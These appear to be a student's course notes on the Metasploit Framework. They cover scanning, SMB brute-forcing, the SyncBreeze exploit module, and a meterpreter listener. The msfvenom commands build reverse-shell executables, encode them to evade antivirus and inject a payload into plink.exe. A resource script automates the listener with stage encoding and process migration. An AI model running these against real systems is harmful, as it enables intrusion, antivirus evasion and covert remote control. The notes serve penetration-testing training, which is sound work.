# Content

- [Content](#content)
  - [Metasploit User Interfaces and Setup](#metasploit-user-interfaces-and-setup)
    - [Getting Familiar with MSF Syntax](#getting-familiar-with-msf-syntax)
    - [Metasploit Database Access](#metasploit-database-access)
    - [Auxiliary Modules](#auxiliary-modules)
  - [Exploit Modules](#exploit-modules)
    - [SyncBreeze Enterprise](#syncbreeze-enterprise)
  - [Metasploit Payloads](#metasploit-payloads)
    - [Staged vs Non-Staged Payloads](#staged-vs-non-staged-payloads)
    - [Meterpreter Payloads](#meterpreter-payloads)
    - [Experimenting with Meterpreter](#experimenting-with-meterpreter)
    - [Executable Payloads](#executable-payloads)
    - [Metasploit Exploit Multi Handler](#metasploit-exploit-multi-handler)
    - [Client-Side Attacks](#client-side-attacks)
    - [Advanced Features and Transports](#advanced-features-and-transports)
  - [Building Our Own MSF Module](#building-our-own-msf-module)
  - [Metasploit Automation](#metasploit-automation)

  
## Metasploit User Interfaces and Setup
### Getting Familiar with MSF Syntax

- Although the Metasploit Framework is preinstalled in Kali Linux, the postgresql service that 
Metasploit depends on is neither active nor enabled at boot time.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/0.png)
- The Metasploit Framework includes several thousand modules, divided into categories. The categories are displayed on the splash screen summary but we can also view them with the show -h command.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/1.png)
- To activate a module, enter use followed by the module name (auxiliary/scanner/portscan/tcp).
  ```bash
  use auxiliary/scanner/portscan/tcp
  ```
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/2.png)
- Most modules require options (show options) before they can be run. We can configure these options with set and unset and can also set and remove global options with setg or unsetg respectively.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/3.png)
- For example, to perform a scan of our Windows workstation with the scanner/portscan/tcp module, we must first set the remote host IP address (RHOSTS) with the set command.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/4.png)

### Metasploit Database Access

- If the postgresql service is running, Metasploit will log findings and information about discovered hosts, services, or credentials in a convenient, accessible database.
- The database has been populated with the results of the TCP scan we ran in the previous section. We can display these results with the services command.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/5.png)
  - If we see that ``` Databast not connected ```, because PostgreSQL is not listening on port 5432, which Metasploit requires, but on port 5433. So we need to change to port 5433.
    ```bash
    sudo ss -lntp | grep post
    sudo grep "port =" /etc/postgresql/15/main/postgresql.conf
    sudo sed -i 's/\(port = \)5433/\15432/' /etc/postgresql/15/main/postgresql.conf
    sudo service postgresql restart
    sudo msfdb reinit              
    ```
    ![Picture](../22.%20The%20Metasploit%20Framework/Image/6.png)
- The basic services command displays all results, but we can also filter by port number (-p), service name (-s), and more as shown in the help output of services -h.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/7.png)
- In addition to a simple TCP port scanner, we can also use the db_nmap wrapper to execute Nmap inside Metasploit and save the findings to the database for ease of access. The db_nmapcommand has identical syntax to Nmap and is shown below.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/8.png)
- To display all discovered hosts up to this point, we can issue the hosts command. As an additional example, we can also list all services running on port 445 with the services -p 445 command.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/9.png)
- To help organize content in the database, Metasploit allows us to store information in separate workspaces. When specifying a workspace, we will only see database entries relevant to that workspace, which helps us easily manage data from various enumeration efforts and assignments. We can list the available workspaces with workspace.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/10.png)

### Auxiliary Modules

- There are too many to cover here, but we will demonstrate the syntax and operation of some of the most common auxiliary modules. As an exercise, explore some other auxiliary modules as they are an invaluable part of the Metasploit Framework.
- To list all auxiliary modules, we run the show auxiliary command. This will present a very long list of all auxiliary modules as shown in the truncated output below.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/11.png)
- We can use search to reduce this considerable output, filtering by app, type, platform, and more. 
- For example, we can search for SMB auxiliary modules with search type:auxiliary name:smb.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/12.png)
- After invoking a module with use, we can request more info about it.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/13.png)
- The module description output by info tells us that the purpose of the smb2 module is to detect the version of SMB supported by the remote machines. The module’s Basic options parameters can be inspected by executing the show options command. For this particular module, we just need to set the IP address of our target, in this case our student Windows 10 machine.
- Alternatively, since we have already scanned our Windows 10 machine, we could search the Metasploit database for hosts with TCP port445 open (services -p 445) and automatically add the results to RHOSTS (–rhosts).
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/14.png)
- With the required parameters configured, we can launch the module with run or exploit.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/15.png)
- Based on the module’s output, the remote computer does indeed support SMB version 2. To leverage this, we can use the scanner/smb/smb_login module to attempt a brute force login against the machine. Loading the module and listing the options produces the following output.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/16.png)
- We’ll start by supplying the valid domain name of corp.com, a valid username (thainguyen), an invalidpassword (191011!), and the Windows 10 target’s IP address:

## Exploit Modules
### SyncBreeze Enterprise

- To begin our exploration of exploit modules, we will focus on a service that we’ve abused time and again: SyncBreeze Enterprise. We can search for SyncBreeze modules with search syncbreeze.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/17.png)
- The output reveals two specific exploit modules. We will focus on 10.0.28 and request info about that particular module with info exploit/windows/http/syncbreeze_10_0_28.
  ```bash
  info exploit/windows/http/syncbreeze_bof
  ```
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/18.png)
- To retrieve a listing of all payloads that are compatible with the currently selected exploit module, we run show payloads.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/19.png)
- For example, we can specify a standard reverse shell payload (windows/shell_reverse_tcp) with set payload and list the options with show options.
  ```bash
  set payload windows/shell_reverse_tcp
  show options
  ```
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/20.png)
- By setting the reverse shell payload for our exploit, Metasploit automatically added some new “Payload options”, including LHOST (listen host) and LPORT (listen port), which correspond to the host IP address and port that the reverse shell will connect to.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/21.png)
- After setting LHOST to our Kali IP address and RHOST to the Windows host IP address, we can use check to verify whether or not the target host and application are vulnerable to the exploit.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/22.png)
  - Exploit not suitable for this target because the version of SyncBreeze Enterprise running on the target is not 10.0.28.

## Metasploit Payloads
### Staged vs Non-Staged Payloads

- Before jumping into specific shellcode functionality, we must discuss the distinction between staged and non-staged shellcode, as evidenced by the description of these two payloads.
  ```bash
  windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell
  windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)
  ```

### Meterpreter Payloads
### Experimenting with Meterpreter
### Executable Payloads

- The Metasploit Framework payloads can also be exported into various file types and formats, such as ASP, VBScript, Jar, War, Windows DLL and EXE, and more.
- For example, let’s use the msfvenom715 utility to generate a raw Windows PE reverse shell executable. We’ll use the -p flag to set the payload, set LHOST and LPORT to assign the listening host and port, -f to set the output format (exe in this case), and -o to specify the output file name.
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.156 LPORT=443 -f exe -o shell_reverse.exe
  ```
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/23.png)
- The shellcode embedded in the PE file can be encoded using any of the many MSF encoders. Historically, this helped evade antivirus, though this is no longer true with modern AV engines. The encoding is configured with -e to specify the encoder type and -i to set the desired number of encoding iterations. We can use multiple encoding iterations to further obfuscate the binary, which could effectively evade rudimentary signature detection.
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.156 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
  ```
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/24.png)
- Another useful feature of Metasploit is the ability to inject a payload into an existing PE file, which may further reduce the chances of AV detection. The injection is done with the -x flag, specifying the file to inject into.
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.156 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
  ```
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/25.png)

### Metasploit Exploit Multi Handler

- When using the multi/handler module, we must specify the incoming payload type.
- In the example below, we will instruct the multi/handler to expect and accept an incoming windows/meterpreter/reverse_https Meterpreter payload that will start a first stage listener on our desired port, TCP 443. Once the first stage payload is accepted by the multi/handler, the second stage of the payload will be fed back to the target machine and executed.
- After setting the parameters, we will run exploit to instruct the multi/handler to listen for a connection.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/26.png)
- Note that using the exploit command without parameters will block the command prompt until execution finishes. In most cases, it is more helpful to include the -j flag to run the module as a background job, allowing us to continue other work while we wait for the connection. The jobs command allows us to view running background jobs.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/27.png)

### Client-Side Attacks

- The Metasploit Framework also offers many features that assist with client-side attacks, including various executable formats beyond those we have already explored. We can review some of these executable formats with the -l formats option of msfvenom.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/28.png)
- The hta-psh, vba, and vba-psh formats are designed for use in client-side attacks by creating either a malicious HTML Application or an Office macro for use in a Word or Excel document, respectively.
- The MSF also contains many browser exploits. For example, we can search for “flash” to display multiple Flash-based exploits.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/29.png)

### Advanced Features and Transports

- With an understanding of the basic functionality of the Metasploit Framework and the meterpreter payload, we can proceed to more advanced options, which we can display with the show advanced command.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/30.png)
- We could use EnableStageEncoding together with StageEncoder to encode the second stage and possibly bypass detection. To do this, we set EnableStageEncoding to “true” and set StageEncoder to our desired encoder, in this case, “x86/shikata_ga_nai”.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/31.png)
- The AutoRunScript option is also quite helpful as it will automatically run a script when a meterpreter connection is established. This is very useful during a client-side attack since we may not be available when a user executes our payload, meaning the session could sit idle or be lost. 
- For example, we can configure the gather/enum_logged_on_users module to automatically enumerate logged-in users when meterpreter connects.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/32.png)

## Building Our Own MSF Module

- Even the most unskilled programmer can build a custom MSF module. The Ruby language and exploit structure are clear, straightforward, and very similar to Python. To show how this works, we will port our SyncBreeze Python exploit to the Metasploit format, using an existing exploit in the framework as a template and copying it to the established folder structure under the home directory of the root user.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/33.png)
- To begin, we will update the header information, including the name of the module, its description, 
author, and external references. Putting all the parts together gives us a complete Metasploit exploit module for the SyncBreeze Enterprise vulnerability.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/34.png)
- With the exploit complete, we can start Metasploit and search for it.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/35.png)
- We notice that the search for syncbreeze now contains three results and that the second result is our custom exploit. Next we’ll choose a payload, set up the required parameters, and perform a vulnerability check.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/36.png)
- Finally, we launch our exploit to gain a reverse shell.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/37.png)

## Metasploit Automation

- While the Metasploit Framework automates quite a bit for us, we can further automate repetitive commands inside the framework itself.
- When we use a payload to create a standalone executable or a client-side attack vector like an HTML application, we select options like payload type, local host, and local port. The same options must then be set in the multi/handler module. To streamline this, we can take advantage of Metasploit resource scripts. We can use any number of Metasploit commands in a resource script.
- For example, using a standard editor, we will create a script in our home directory named setup.rc. In this script, we will set the payload to windows/meterpreter/reverse_https and configure the relevant LHOST and LPORT parameters. We also enable stage encoding using the x86/shikata_ga_nai encoder and configure the post/windows/manage/migrate module to be executed automatically using the AutoRunScript option. This will cause the spawned meterpreter to automatically launch a background notepad.exe process and migrate to it. Finally, the 
ExitOnSession parameter is set to “false” to ensure that the listener keeps accepting new connections and the module is executed with the -j and -z flags to stop us from automatically interacting with the session. The commands for this are as follows.
  ```bash
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_https
  set LHOST 10.11.0.4
  set LPORT 443
  set EnableStageEncoding true
  set StageEncoder x86/shikata_ga_nai
  set AutoRunScript post/windows/manage/migrate 
  set ExitOnSession false
  exploit -j -z
  ```
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/38.png)
- After saving the script, we can execute it by passing the -r flag to msfconsole.
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/39.png)
- With the listener configured and running, we can, for example, launch an executable containing a meterpreter payload from our Windows VM. We can create this executable with msfvenom.
  ```bash
  msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.50.156 LPORT=443 -f exe -o met.exe
  ```
  ![Picture](../22.%20The%20Metasploit%20Framework/Image/40.png)
- When executed, our multi/handler accepts the connection.
- The session was spawned using an encoded second stage payload and successfully migrated automatically into the notepad.exe process.